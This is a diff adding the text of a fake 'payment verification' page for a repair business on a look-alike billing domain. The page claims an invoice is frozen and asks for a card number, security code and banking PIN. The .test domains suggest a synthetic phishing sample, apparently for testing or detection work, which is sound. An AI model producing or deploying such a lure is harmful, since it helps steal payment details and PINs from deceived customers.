@@ -1,0 +1,9 @@
+cedar-repairs-billing.test
+Cedar Repairs payment verification
+
+Your invoice is frozen. This verification page is outside cedar-repairs.test. Supply your card number, security code and banking PIN to release the invoice.
+
+Card number
+Security code
+Banking PIN
+Verify
